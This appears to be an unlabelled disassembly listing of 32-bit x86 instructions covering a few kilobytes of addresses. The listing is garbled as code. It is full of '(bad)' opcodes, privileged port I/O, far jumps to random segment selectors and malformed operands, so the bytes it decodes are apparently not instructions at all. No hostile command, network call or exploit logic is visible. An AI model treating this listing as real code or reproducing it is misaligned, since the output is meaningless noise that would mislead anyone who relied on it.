  4205af:	les    ecx,FWORD PTR ds:0xdbc3fed2
  4205b5:	mov    dl,BYTE PTR [edi+0x3c]
  4205b8:	aaa    
  4205b9:	cmp    al,0x70
  4205bb:	jecxz  0x420630
  4205bd:	je     0x420569
  4205bf:	int3   
  4205c0:	adc    eax,0xb25f5824
  4205c5:	repz pop ebp
  4205c7:	adc    eax,0x88a854e0
  4205cc:	(bad)  
  4205cd:	jb     0x420633
  4205cf:	icebp  
  4205d0:	aad    0x7f
  4205d2:	mov    ch,0x88
  4205d4:	inc    esi
  4205d5:	dec    ebx
  4205d6:	mov    edx,0x985b029f
  4205db:	daa    
  4205dc:	ficom  DWORD PTR [edi+0x26]
  4205df:	dec    ebp
  4205e0:	jmp    0x4dfe:0xcb5d9c2a
  4205e7:	inc    edi
  4205e8:	in     eax,dx
  4205e9:	push   es
  4205ea:	push   ecx
  4205eb:	rcr    edx,0x82
  4205ee:	ins    BYTE PTR es:[edi],dx
  4205ef:	pushf  
  4205f0:	mov    bl,0x10
  4205f2:	push   eax
  4205f3:	pop    edi
  4205f4:	xchg   ecx,eax
  4205f5:	js     0x42058e
  4205f7:	adc    eax,0xe6bd9a77
  4205fc:	xor    al,BYTE PTR [edx+0x31]
  4205ff:	sub    al,0x64
  420601:	push   0xffffffab
  420603:	ja     0x42060a
  420605:	test   BYTE PTR [ecx],dh
  420607:	and    al,bl
  420609:	outs   dx,BYTE PTR ds:[esi]
  42060a:	cmp    ah,BYTE PTR [esi+ecx*4+0x10830f38]
  420611:	mov    cl,0xe4
  420613:	(bad)  
  420614:	clc    
  420615:	mov    WORD PTR [ecx+0x2f3fa89c],?
  42061b:	scas   al,BYTE PTR es:[edi]
  42061c:	mov    eax,ds:0x51bc6831
  420621:	xchg   esi,eax
  420622:	add    eax,0x88d0d2d2
  420627:	pop    ss
  420628:	jb     0x42065f
  42062a:	pop    esp
  42062b:	je     0x420652
  42062d:	xchg   ebp,eax
  42062e:	mov    DWORD PTR [ecx],edx
  420630:	sar    DWORD PTR [edx],0xd2
  420633:	out    dx,eax
  420634:	mov    DWORD PTR [edx+0x19eff375],esp
  42063a:	cmp    ebx,DWORD PTR [esi+0x297b96db]
  420640:	out    0xb4,al
  420642:	jl     0x420647
  420644:	or     eax,0x5072e8aa
  420649:	imul   BYTE PTR [esp+edx*4-0x43]
  42064d:	adc    DWORD PTR [esi+0x60],esp
  420650:	sub    eax,0x48072950
  420655:	jo     0x4205e2
  420657:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  420659:	pop    esi
  42065a:	stos   DWORD PTR es:[edi],eax
  42065b:	pop    ebx
  42065c:	(bad)  
  42065d:	js     0x4205e3
  42065f:	aad    0xac
  420661:	inc    eax
  420662:	loopne 0x420607
  420664:	retf   0xf04b
  420667:	fwait
  420668:	jne    0x4206a1
  42066a:	(bad)  [eax]
  42066c:	dec    esi
  42066d:	cld    
  42066e:	jl     0x420691
  420670:	cmc    
  420671:	dec    DWORD PTR [eax]
  420673:	dec    eax
  420674:	aam    0xbc
  420676:	xlat   BYTE PTR ds:[ebx]
  420677:	scas   al,BYTE PTR es:[edi]
  420678:	lods   eax,DWORD PTR ds:[esi]
  420679:	(bad)  [edx-0x5b]
  42067c:	and    BYTE PTR [eax-0x55],al
  42067f:	shl    BYTE PTR [eax*4-0x58d4b014],cl
  420686:	pop    eax
  420687:	in     al,0x5b
  420689:	(bad)  
  42068a:	(bad)  
  42068b:	loope  0x42068e
  42068d:	push   cs
  42068e:	ror    BYTE PTR [edi],cl
  420690:	xor    DWORD PTR [edi+0x396d757e],esi
  420696:	fcom   QWORD PTR [ebx+esi*2+0x73b99b12]
  42069d:	sbb    esp,DWORD PTR [ecx+eax*8+0x1edaabb]
  4206a4:	push   cs
  4206a5:	adc    edx,ebp
  4206a7:	ja     0x42069a
  4206a9:	or     eax,0xdeadaece
  4206ae:	jge    0x42065b
  4206b0:	mov    dl,0xad
  4206b2:	out    0xf8,al
  4206b4:	pop    ds
  4206b5:	mov    bh,0xbb
  4206b7:	jle    0x420717
  4206b9:	dec    esi
  4206ba:	jnp    0x4206b9
  4206bc:	sbb    BYTE PTR [esi+0x50],cl
  4206bf:	cmp    DWORD PTR fs:[eax],esi
  4206c2:	sahf   
  4206c3:	repz push ds
  4206c5:	mov    ebp,0x6dfd33b7
  4206ca:	push   ebp
  4206cb:	push   ecx
  4206cc:	shl    DWORD PTR [ebx+0xce81940],0xd2
  4206d3:	sub    cl,bl
  4206d5:	aad    0x69
  4206d7:	dec    ebp
  4206d8:	retf   0xc4da
  4206db:	sti    
  4206dc:	cmp    ebp,ebp
  4206de:	loope  0x420755
  4206e0:	mov    ds:0xddb58c8c,al
  4206e5:	sbb    al,0x40
  4206e7:	inc    esi
  4206e8:	add    BYTE PTR [eax+0x7fb47f3f],ch
  4206ee:	xor    cl,al
  4206f0:	scas   eax,DWORD PTR es:[edi]
  4206f1:	xchg   esi,eax
  4206f2:	jb     0x42073a
  4206f4:	mov    edi,0xf2c78e31
  4206f9:	in     eax,dx
  4206fa:	add    DWORD PTR ds:0x2e58b4cf,ebp
  420700:	push   ecx
  420701:	loop   0x420739
  420703:	not    DWORD PTR [ebx]
  420705:	dec    edi
  420706:	push   ecx
  420707:	mov    al,ds:0x44f443e7
  42070c:	leave  
  42070d:	outs   dx,BYTE PTR ds:[esi]
  42070e:	dec    eax
  42070f:	jne    0x42076d
  420711:	lock xor edi,DWORD PTR [edi+0x6f1c4a9b]
  420718:	add    BYTE PTR [edx],al
  42071a:	pop    eax
  42071b:	test   al,0x84
  42071d:	test   eax,0xe2e66b51
  420722:	push   es
  420723:	inc    esi
  420724:	pop    ecx
  420725:	(bad)  
  420726:	and    al,0xf
  420728:	or     dh,BYTE PTR [edi+0x15]
  42072b:	inc    ecx
  42072c:	add    ah,dl
  42072e:	mov    ecx,0xdb6c97b3
  420733:	jae    0x4206b8
  420735:	pop    esi
  420736:	sbb    BYTE PTR [edx],ah
  420738:	inc    esp
  420739:	leave  
  42073a:	lds    esi,FWORD PTR [edi]
  42073c:	mov    esp,0xb55374aa
  420741:	(bad)  
  420742:	retf   
  420743:	sub    al,0x54
  420745:	jmp    0x1e5d:0xa0f193ef
  42074c:	adc    DWORD PTR [ebp+0x7c],0x7d8847e4
  420753:	mov    ch,0xcc
  420755:	lods   eax,DWORD PTR ds:[esi]
  420756:	mov    bl,0x33
  420758:	bound  ebx,QWORD PTR [esi-0x78]
  42075b:	jns    0x4207c6
  42075d:	inc    edx
  42075e:	mov    cl,0xe6
  420760:	out    0x3,al
  420762:	adc    ebp,edx
  420764:	test   BYTE PTR [edx+ebx*4+0x1783af0b],al
  42076b:	mov    WORD PTR [ecx],?
  42076d:	sub    al,0x48
  42076f:	cmp    ebx,DWORD PTR [esi+0x4233ef16]
  420775:	push   edi
  420776:	mov    esi,0xb66815b1
  42077b:	push   ss
  42077c:	leave  
  42077d:	or     DWORD PTR [ecx],edi
  42077f:	call   0xda01:0x6c091da8
  420786:	in     eax,0x34
  420788:	pop    eax
  420789:	push   edi
  42078a:	inc    ecx
  42078b:	add    eax,0x7e3b32e2
  420790:	xor    al,0xf
  420792:	call   0xc916:0x6964745d
  420799:	aas    
  42079a:	dec    eax
  42079b:	add    DWORD PTR [eax-0x5894c20d],eax
  4207a1:	sub    BYTE PTR [eax-0x3a],0x7c
  4207a5:	mov    DWORD PTR ds:0xe72ebc0f,eax
  4207ab:	sbb    al,0x6
  4207ad:	and    ch,BYTE PTR [eax+0x1d]
  4207b0:	pop    edx
  4207b1:	xchg   ebp,eax
  4207b2:	clc    
  4207b3:	arpl   WORD PTR [ebx+edi*8+0x135dd440],dx
  4207ba:	jnp    0x420775
  4207bc:	or     eax,ebp
  4207be:	cwde   
  4207bf:	dec    edx
  4207c0:	stos   BYTE PTR es:[edi],al
  4207c1:	test   BYTE PTR [edi-0x37],ah
  4207c4:	sub    esp,DWORD PTR [ecx]
  4207c6:	popf   
  4207c7:	mov    al,0x90
  4207c9:	sub    DWORD PTR [ecx+eiz*2-0x5e],eax
  4207cd:	sbb    eax,0x6bf552f3
  4207d2:	xor    BYTE PTR [esi-0x34],ch
  4207d5:	mov    ch,BYTE PTR [ebx+0x20]
  4207d8:	aas    
  4207d9:	cmp    DWORD PTR [ecx+esi*2-0x24],eax
  4207dd:	fdivr  DWORD PTR [ebx+0xb1047a4]
  4207e3:	icebp  
  4207e4:	push   es
  4207e5:	mov    ecx,0x1a51a2a3
  4207ea:	sti    
  4207eb:	push   cs
  4207ec:	aad    0x30
  4207ee:	sub    BYTE PTR [eax+0x4],ch
  4207f1:	pusha  
  4207f2:	xchg   ebp,eax
  4207f3:	cld    
  4207f4:	lea    ebx,ds:0xdd00ccde
  4207fa:	mov    cl,0x3b
  4207fc:	xor    esi,0xffffff8b
  4207ff:	retf   0x46cc
  420802:	mov    esp,0x1b84547e
  420807:	adc    ecx,0x62
  42080a:	fwait
  42080b:	mov    BYTE PTR [eax+0x52385ecb],dl
  420811:	mov    ds:0xa99ac6c4,al
  420816:	dec    ebp
  420817:	movzx  ecx,cx
  42081a:	repnz cmc 
  42081c:	shl    BYTE PTR [ecx+0x1143a327],1
  420822:	rcr    DWORD PTR [esi],cl
  420824:	call   0xbb32a66f
  420829:	and    BYTE PTR [ebx+0x3a],bh
  42082c:	sub    BYTE PTR [edx+0xc],al
  42082f:	jg     0x42088f
  420831:	dec    ecx
  420832:	sbb    BYTE PTR [edx],0x56
  420835:	xor    al,BYTE PTR [edi-0x19d78d06]
  42083b:	and    ecx,DWORD PTR [edx-0x19]
  42083e:	test   DWORD PTR [ebx-0x7a],0x77aa7b54
  420845:	pop    edi
  420846:	outs   dx,BYTE PTR ds:[esi]
  420847:	js     0x4207f4
  420849:	fbstp  TBYTE PTR [edi+0x56a5ca61]
  42084f:	lea    edx,[eax+0x6]
  420852:	jae    0x420820
  420854:	ror    DWORD PTR [ecx+0x3365e28f],0x92
  42085b:	push   es
  42085c:	cmp    DWORD PTR [ebx],eax
  42085e:	stos   DWORD PTR es:[edi],eax
  42085f:	pushf  
  420860:	ss mov esi,0x1d4651f9
  420866:	mov    ebp,0xcd8db086
  42086b:	push   ds
  42086c:	push   es
  42086d:	neg    BYTE PTR ds:0x617416e8
  420873:	stc    
  420874:	dec    eax
  420875:	stos   DWORD PTR es:[edi],eax
  420876:	mov    edi,0x35894fda
  42087b:	repz jns 0x4208cf
  42087e:	pop    ds
  42087f:	mov    edx,?
  420881:	mov    WORD PTR ds:0xa11e42d,?
  420887:	adc    BYTE PTR [ecx-0x5b],cl
  42088a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42088b:	stos   DWORD PTR es:[edi],eax
  42088c:	ins    BYTE PTR es:[edi],dx
  42088d:	mov    BYTE PTR [esp+edi*8+0x65],dh
  420891:	dec    ebx
  420892:	push   ecx
  420893:	(bad)  [edx+0x24]
  420896:	push   ecx
  420897:	sbb    cl,ah
  420899:	mov    ebp,0x995c083c
  42089e:	or     eax,0x4b94fcdc
  4208a3:	mov    ch,0xd2
  4208a5:	jb     0x4208b1
  4208a7:	test   al,0xd8
  4208a9:	ss inc eax
  4208ab:	stos   BYTE PTR es:[edi],al
  4208ac:	sub    BYTE PTR [ecx],dl
  4208ae:	mov    esp,0x16eb4e75
  4208b3:	push   eax
  4208b4:	pop    es
  4208b5:	outs   dx,DWORD PTR ds:[esi]
  4208b6:	stos   DWORD PTR es:[edi],eax
  4208b7:	dec    esp
  4208b8:	scas   al,BYTE PTR es:[edi]
  4208b9:	jg     0x420921
  4208bb:	mov    ecx,0xb6b96483
  4208c0:	xor    BYTE PTR [esi+0x10],al
  4208c3:	mov    edi,DWORD PTR [ebx+edi*1+0x1b]
  4208c7:	loop   0x420905
  4208c9:	jns    0x42089b
  4208cb:	mov    ah,BYTE PTR [ebx-0xd]
  4208ce:	push   edx
  4208cf:	xor    al,0xb1
  4208d1:	stos   BYTE PTR es:[edi],al
  4208d2:	ins    BYTE PTR es:[edi],dx
  4208d3:	and    al,0x9a
  4208d5:	mov    al,0x5f
  4208d7:	sbb    eax,0x344591a3
  4208dc:	cmp    eax,0x9a125631
  4208e1:	lods   al,BYTE PTR ds:[esi]
  4208e2:	into   
  4208e3:	scas   al,BYTE PTR es:[edi]
  4208e4:	adc    cl,dh
  4208e6:	mov    ebx,0x3698c8c5
  4208eb:	(bad)  
  4208ec:	xor    ch,dl
  4208ee:	into   
  4208ef:	cmp    eax,0x1d311c81
  4208f4:	cwde   
  4208f5:	adc    al,BYTE PTR [edi+eax*4]
  4208f8:	jne    0x4208b7
  4208fa:	pop    ss
  4208fb:	xor    BYTE PTR [edi+0x6a],dl
  4208fe:	outs   dx,BYTE PTR ds:[esi]
  4208ff:	ret    
  420900:	mov    dl,0x5d
  420902:	add    esi,DWORD PTR [edx]
  420904:	sbb    bh,ch
  420906:	sub    edi,DWORD PTR [edi+eiz*1+0x2b7d1305]
  42090d:	adc    al,0x9e
  42090f:	add    bh,BYTE PTR [esi+eiz*4+0x2a]
  420913:	ins    DWORD PTR es:[edi],dx
  420914:	xchg   ebx,eax
  420915:	mov    dh,0xae
  420917:	push   cx
  420919:	or     al,0xa4
  42091b:	push   edi
  42091c:	jmp    0x4208d5
  42091e:	shl    BYTE PTR [esi+eiz*4+0x6ad85faf],0x4e
  420926:	and    BYTE PTR [edx-0x71],bh
  420929:	shl    cl,0x8a
  42092c:	mov    ecx,DWORD PTR [edi-0x407f3346]
  420932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420933:	xor    eax,0x3b4900af
  420938:	add    eax,0xe2c9966e
  42093d:	mov    al,0x56
  42093f:	jbe    0x420992
  420941:	xchg   ecx,eax
  420942:	adc    ebx,DWORD PTR [edx-0x21]
  420945:	jp     0x420921
  420947:	pop    ecx
  420948:	mov    dh,0x99
  42094a:	cmp    eax,0x15250429
  42094f:	mov    ds:0x5b944f7d,eax
  420954:	je     0x42090b
  420956:	out    0xa7,al
  420958:	or     BYTE PTR [ebx],ah
  42095a:	push   ebp
  42095b:	and    cl,BYTE PTR [eax-0x3c]
  42095e:	and    ah,BYTE PTR [ebx-0x73]
  420961:	push   ecx
  420962:	and    BYTE PTR [ebp-0x7beb0f13],0x31
  420969:	ins    DWORD PTR es:[edi],dx
  42096a:	add    eax,0x4ced2783
  42096f:	popa   
  420970:	jbe    0x4209a3
  420972:	jle    0x4209df
  420974:	call   0x80:0x4f4b1e67
  42097b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42097c:	test   ecx,ecx
  42097e:	xchg   edx,eax
  42097f:	ds call 0x9fdc1799
  420985:	sub    ebp,esi
  420987:	mov    ds:0x3f5a4195,al
  42098c:	jae    0x420978
  42098e:	aam    0x3b
  420990:	push   0x1d
  420992:	jb     0x420a0e
  420994:	jbe    0x4209d9
  420996:	mov    ds:0x710f7950,eax
  42099b:	iret   
  42099c:	sbb    al,0x64
  42099e:	dec    edx
  42099f:	pop    ss
  4209a0:	(bad)  
  4209a1:	cmp    DWORD PTR [ebx],edx
  4209a3:	cmp    DWORD PTR [ebx-0x4f],ebp
  4209a6:	repnz aad 0xc7
  4209a9:	pop    ds
  4209aa:	inc    ebp
  4209ab:	ret    
  4209ac:	mov    ds:0x2c3da73e,eax
  4209b1:	icebp  
  4209b2:	sbb    DWORD PTR [eax],0xf2040a37
  4209b8:	dec    ebx
  4209b9:	mov    dh,0x7f
  4209bb:	outs   dx,DWORD PTR ds:[esi]
  4209bc:	les    ebp,FWORD PTR [eax+0x50]
  4209bf:	cmp    al,ch
  4209c1:	mov    dl,0xb8
  4209c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209c4:	das    
  4209c5:	mov    bl,0xc
  4209c7:	out    dx,al
  4209c8:	lods   eax,DWORD PTR fs:[esi]
  4209ca:	mov    bh,0xc8
  4209cc:	inc    ecx
  4209cd:	sub    BYTE PTR [eax+0x2],0xdb
  4209d1:	xor    al,0x1e
  4209d3:	jb     0x420a2f
  4209d5:	pop    ss
  4209d6:	mov    ds:0xacf97c8f,eax
  4209db:	jo     0x420a32
  4209dd:	aas    
  4209de:	pushf  
  4209df:	sub    DWORD PTR [ebp+0xa3780b5],esi
  4209e5:	dec    ecx
  4209e6:	pop    eax
  4209e7:	aas    
  4209e8:	xchg   esp,eax
  4209e9:	adc    BYTE PTR [edi-0x30b06dc5],0xad
  4209f0:	ret    0x44a7
  4209f3:	and    al,0x7e
  4209f5:	xlat   BYTE PTR ds:[ebx]
  4209f6:	das    
  4209f7:	sbb    dl,BYTE PTR [eax-0x74]
  4209fa:	and    edi,DWORD PTR [ebp-0x75]
  4209fd:	jmp    0x1ce8cc13
  420a02:	jo     0x420a3c
  420a04:	ins    DWORD PTR es:[edi],dx
  420a05:	div    BYTE PTR [eax-0x494d6107]
  420a0b:	ret    
  420a0c:	mov    ebp,0x322c7f51
  420a11:	cmp    al,0x6a
  420a13:	in     eax,dx
  420a14:	jmp    0x82e99156
  420a19:	adc    BYTE PTR fs:[ebp-0x73],dh
  420a1d:	daa    
  420a1e:	je     0x420a70
  420a20:	lods   al,BYTE PTR ds:[esi]
  420a21:	mov    BYTE PTR [esi+edx*4],dh
  420a24:	out    0x7a,eax
  420a26:	pop    ds
  420a27:	mov    ebx,0xd2678f5e
  420a2c:	scas   al,BYTE PTR es:[edi]
  420a2d:	cs jmp 0x4209fc
  420a30:	int3   
  420a31:	fs sti 
  420a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a34:	lds    edi,FWORD PTR ds:0x2ef1928
  420a3a:	retf   0xeae9
  420a3d:	loopne 0x420a2a
  420a3f:	test   al,0x38
  420a41:	sbb    DWORD PTR [ebp+0x5d1d434b],ecx
  420a47:	jge    0x420a5b
  420a49:	imul   esi,DWORD PTR [ebx+0x4fcda852],0xffffff85
  420a50:	sbb    eax,0xa59d3317
  420a55:	cmp    al,0x2
  420a57:	ss popf 
  420a59:	imul   ebx,DWORD PTR [ebx+0x46],0xc85d1c7b
  420a60:	repnz icebp 
  420a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a63:	or     al,ch
  420a65:	std    
  420a66:	inc    edx
  420a67:	in     eax,dx
  420a68:	jb     0x420ad0
  420a6a:	shl    DWORD PTR [ebx],1
  420a6c:	or     ch,BYTE PTR [esi-0x3c]
  420a6f:	mov    ch,0x58
  420a71:	add    al,0x64
  420a73:	push   0x4d
  420a75:	loopne 0x420a26
  420a77:	scas   eax,DWORD PTR es:[edi]
  420a78:	rol    ah,cl
  420a7a:	fistp  WORD PTR [ebp-0x2fbf02c8]
  420a80:	inc    ecx
  420a81:	jae    0x420ad1
  420a83:	and    eax,0xc82d14d6
  420a88:	xlat   BYTE PTR ds:[ebx]
  420a89:	aam    0x1e
  420a8b:	ss out dx,eax
  420a8d:	retf   
  420a8e:	push   edx
  420a8f:	cmp    eax,0x51a432d2
  420a94:	dec    edx
  420a95:	mov    dh,0xca
  420a97:	adc    DWORD PTR [edi-0x27826b13],edx
  420a9d:	dec    ebp
  420a9e:	xor    eax,0x831128fb
  420aa3:	or     ch,BYTE PTR [ebp+0x3a]
  420aa6:	scas   eax,DWORD PTR es:[edi]
  420aa7:	stc    
  420aa8:	stos   DWORD PTR es:[edi],eax
  420aa9:	xor    al,0xa2
  420aab:	(bad)  
  420aac:	adc    BYTE PTR [ebp-0x382e4a84],dl
  420ab2:	sub    ah,cl
  420ab4:	mov    esp,0x8ef79981
  420ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420aba:	mov    BYTE PTR [esi],dl
  420abc:	clc    
  420abd:	add    DWORD PTR ds:0x5d6e99e8,ecx
  420ac3:	push   edx
  420ac4:	cld    
  420ac5:	add    esi,ebp
  420ac7:	in     al,dx
  420ac8:	xor    ebp,DWORD PTR [edx]
  420aca:	jl     0x420b40
  420acc:	scas   eax,DWORD PTR es:[edi]
  420acd:	mov    ch,0x8c
  420acf:	loope  0x420aad
  420ad1:	add    ebx,DWORD PTR [ebx+0x207fa8fc]
  420ad7:	in     al,0xf6
  420ad9:	loope  0x420b3e
  420adb:	add    BYTE PTR [esi-0x55],0x74
  420adf:	sub    edi,esp
  420ae1:	add    edx,esp
  420ae3:	sub    ebx,esp
  420ae5:	push   ebp
  420ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ae7:	push   ebp
  420ae8:	ss mov cl,0xa3
  420aeb:	js     0x420a8b
  420aed:	mov    cl,0xf3
  420aef:	pop    esp
  420af0:	sub    cl,BYTE PTR [ebx+0x3eacb339]
  420af6:	xor    BYTE PTR [ebx],0x23
  420af9:	pop    ss
  420afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420afb:	push   ecx
  420afc:	adc    ch,ch
  420afe:	lock mov WORD PTR [eax+esi*1],fs
  420b02:	les    edi,FWORD PTR [edx-0x10da510a]
  420b08:	rcr    BYTE PTR [eax],0x5c
  420b0b:	sbb    dl,BYTE PTR [edi+0x4e9405fa]
  420b11:	lea    edi,[eax]
  420b13:	fiadd  DWORD PTR [eax-0x51e3b7c4]
  420b19:	and    esi,DWORD PTR [edx+0x68]
  420b1c:	push   es
  420b1d:	shr    DWORD PTR [edx-0x4e],cl
  420b20:	das    
  420b21:	or     al,0x4
  420b23:	adc    edx,DWORD PTR [esi+0x48]
  420b26:	sbb    eax,0x600f6fca
  420b2b:	mov    dh,0x4a
  420b2d:	cld    
  420b2e:	inc    ecx
  420b2f:	xchg   esp,eax
  420b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b32:	adc    ecx,DWORD PTR [eax]
  420b34:	and    eax,0x12d2bc5b
  420b39:	push   ss
  420b3a:	popa   
  420b3b:	mov    al,0x1e
  420b3d:	cmp    ch,ah
  420b3f:	fcmovu st,st(1)
  420b41:	inc    eax
  420b42:	sbb    eax,DWORD PTR [eax+0x6a293d53]
  420b48:	push   eax
  420b49:	add    DWORD PTR [ebx-0x2becf5c],0xa5601b88
  420b53:	sbb    BYTE PTR [ebx-0xf],dh
  420b56:	adc    ch,BYTE PTR [edi]
  420b58:	dec    ebx
  420b59:	mov    dh,dl
  420b5b:	lock xchg BYTE PTR [edi+0x2],bl
  420b5f:	clc    
  420b60:	xchg   esi,eax
  420b61:	nop
  420b62:	loope  0x420b37
  420b64:	rol    DWORD PTR [eax+ebx*4],1
  420b67:	push   cs
  420b68:	mov    eax,0xd65ee1c6
  420b6d:	jl     0x420b67
  420b6f:	add    eax,0xdb663489
  420b74:	imul   esp,DWORD PTR [edx+esi*4-0x78d3c7bd],0x411f6f90
  420b7f:	clc    
  420b80:	push   ebx
  420b81:	push   ebp
  420b82:	inc    esp
  420b83:	mov    dh,0x2b
  420b85:	dec    ecx
  420b86:	jmp    0xd914:0x1b7cb160
  420b8d:	(bad)  
  420b8e:	mov    fs,WORD PTR [ebx+0x57]
  420b91:	jl     0x420bd7
  420b93:	mov    ds:0x11143d3d,eax
  420b98:	xor    DWORD PTR [edx+eiz*8-0x20],0xd97d7607
  420ba0:	hlt    
  420ba1:	icebp  
  420ba2:	and    DWORD PTR [edi+0x6a],0xadf01ef5
  420ba9:	iret   
  420baa:	sbb    bl,BYTE PTR [edx-0x35]
  420bad:	pop    ds
  420bae:	xor    DWORD PTR [ebp+0x60],0x4f
  420bb2:	aas    
  420bb3:	push   edx
  420bb4:	pop    es
  420bb5:	cdq    
  420bb6:	dec    esp
  420bb7:	jo     0x420c35
  420bb9:	repz into 
  420bbb:	shl    DWORD PTR ds:[ebp-0x195b36f9],1
  420bc2:	jno    0x420b49
  420bc4:	pop    ecx
  420bc5:	arpl   cx,di
  420bc7:	repz js 0x420b90
  420bca:	jnp    0x420bf2
  420bcc:	dec    ebp
  420bcd:	popf   
  420bce:	xchg   ecx,eax
  420bcf:	mov    cs,ebp
  420bd1:	mov    eax,ds:0x60bdb682
  420bd6:	or     eax,DWORD PTR [eax]
  420bd8:	or     ah,dh
  420bda:	lock cld 
  420bdc:	mov    dl,0xa0
  420bde:	sbb    cl,BYTE PTR ds:0x3db1fe92
  420be4:	jmp    0x131c:0xf7766d2b
  420beb:	lock shl BYTE PTR [ebp-0x166de44f],cl
  420bf2:	adc    al,BYTE PTR [edi-0x2a467d3e]
  420bf8:	mov    eax,ds:0x44e5b57b
  420bfd:	xchg   edx,eax
  420bfe:	or     DWORD PTR [edx-0x657142a],ecx
  420c04:	mov    dh,0xf0
  420c06:	test   esi,ecx
  420c08:	rol    DWORD PTR [ebp+0x7f8a02d7],0xc3
  420c0f:	and    dl,al
  420c11:	retf   0x105c
  420c14:	lea    esi,[edx-0x28]
  420c17:	inc    ebx
  420c18:	fcmove st,st(5)
  420c1a:	adc    al,0x79
  420c1c:	xor    edi,ebx
  420c1e:	repnz aaa 
  420c20:	mov    ch,0x0
  420c22:	stos   DWORD PTR es:[edi],eax
  420c23:	ficom  WORD PTR [edx-0x57a06aeb]
  420c29:	cmp    bh,BYTE PTR [ecx-0x6a]
  420c2c:	repnz aaa 
  420c2e:	sub    al,bh
  420c30:	rcr    DWORD PTR [ecx-0x4eb8ee57],cl
  420c36:	add    al,0x1b
  420c38:	in     eax,0x9
  420c3a:	retf   0x2152
  420c3d:	lahf   
  420c3e:	jnp    0x420bdd
  420c40:	std    
  420c41:	pop    eax
  420c42:	cmp    BYTE PTR cs:[ebx],dh
  420c45:	shl    BYTE PTR [ebx+edi*4],0xb2
  420c49:	push   ss
  420c4a:	shld   DWORD PTR [edi+0x76],ebx,cl
  420c4e:	jbe    0x420c39
  420c50:	fcmovnu st,st(4)
  420c52:	xor    DWORD PTR [edi],eax
  420c54:	ins    BYTE PTR es:[edi],dx
  420c55:	mov    ebp,0x65f25e7a
  420c5a:	dec    edi
  420c5b:	sbb    bh,BYTE PTR [esi+0x76]
  420c5e:	scas   al,BYTE PTR es:[edi]
  420c5f:	push   0x220ea72b
  420c64:	test   DWORD PTR [esi],edi
  420c66:	sahf   
  420c67:	test   eax,0x904bfb88
  420c6c:	aad    0x98
  420c6e:	lods   al,BYTE PTR ds:[esi]
  420c6f:	lea    edi,[edi+0x2d8d3538]
  420c75:	imul   ebp,DWORD PTR [edx-0x72dc024d],0x7f04bf7a
  420c7f:	ins    BYTE PTR es:[edi],dx
  420c80:	adc    ecx,DWORD PTR [esi]
  420c82:	out    dx,al
  420c83:	pusha  
  420c84:	xor    DWORD PTR ds:0x4e117a05,edx
  420c8a:	xchg   ebp,eax
  420c8b:	outs   dx,BYTE PTR ds:[esi]
  420c8c:	scas   al,BYTE PTR es:[edi]
  420c8d:	pop    ss
  420c8e:	scas   al,BYTE PTR es:[edi]
  420c8f:	or     DWORD PTR [edi-0x32],ebx
  420c92:	mov    ebp,0x1e1c1fd4
  420c97:	or     eax,0xaa6d691b
  420c9c:	fidiv  DWORD PTR [ebx-0x42]
  420c9f:	test   eax,0xc77473ef
  420ca4:	lahf   
  420ca5:	push   esi
  420ca6:	jnp    0x420c3e
  420ca8:	cmp    BYTE PTR [edi-0x73c6ef08],bl
  420cae:	adc    DWORD PTR [ecx],esi
  420cb0:	or     al,0x61
  420cb2:	out    dx,eax
  420cb3:	xchg   ecx,eax
  420cb4:	pop    es
  420cb5:	fucomip st,st(4)
  420cb7:	cld    
  420cb8:	in     al,0xfd
  420cba:	and    edx,0xa2f9f7b7
  420cc0:	mov    ebp,0xf28fe759
  420cc5:	jne    0x420cb6
  420cc7:	ds pop eax
  420cc9:	jbe    0x420cb2
  420ccb:	jl     0x420c92
  420ccd:	lods   al,BYTE PTR ds:[esi]
  420cce:	mov    es,WORD PTR [edx+0x2d]
  420cd1:	in     al,0x17
  420cd3:	xlat   BYTE PTR ds:[ebx]
  420cd4:	fmulp  st(7),st
  420cd6:	mov    ds:0xfe5b4183,eax
  420cdb:	iret   
  420cdc:	aad    0x58
  420cde:	pop    edx
  420cdf:	in     eax,dx
  420ce0:	sbb    eax,0x7946b3a8
  420ce5:	mov    cl,0xd9
  420ce7:	out    dx,al
  420ce8:	sub    eax,0x3cd5a224
  420ced:	fcom   QWORD PTR [eax*8+0x276ee1af]
  420cf4:	push   ebx
  420cf5:	mov    gs,ebp
  420cf7:	(bad)
  420cfa:	dec    eax
  420cfb:	(bad)  
  420cfd:	pop    DWORD PTR [ecx+ecx*1+0x4e0c1ac]
  420d04:	retf   0x45d6
  420d07:	sub    edx,DWORD PTR [esp+esi*4]
  420d0a:	mov    ebp,DWORD PTR [edi+0x49e26b4a]
  420d10:	call   0x628e53d9
  420d15:	sahf   
  420d16:	adc    BYTE PTR [ebx-0x3dcbbff1],ah
  420d1c:	popf   
  420d1d:	add    eax,0x38392705
  420d22:	daa    
  420d23:	aas    
  420d24:	xchg   ebp,eax
  420d25:	cmp    DWORD PTR [eax+0x19],esi
  420d28:	and    bl,bh
  420d2a:	lods   al,BYTE PTR ds:[esi]
  420d2b:	repnz mov al,0x46
  420d2e:	gs (bad) 
  420d30:	push   eax
  420d31:	xor    DWORD PTR [esi-0x8810622],0xffffffa2
  420d38:	test   WORD PTR [edx-0x374981f1],0x324
  420d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d42:	retf   0xa5ce
  420d45:	xchg   esp,eax
  420d46:	imul   edi,DWORD PTR [esi+0xbaa6131],0xffffff87
  420d4d:	pop    esi
  420d4e:	call   0x867186be
  420d53:	sub    esi,DWORD PTR [edx+0x1e]
  420d56:	sub    DWORD PTR [edi],0x40d64fcb
  420d5c:	cwde   
  420d5d:	test   eax,0x2550a4db
  420d62:	repnz push 0x48
  420d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
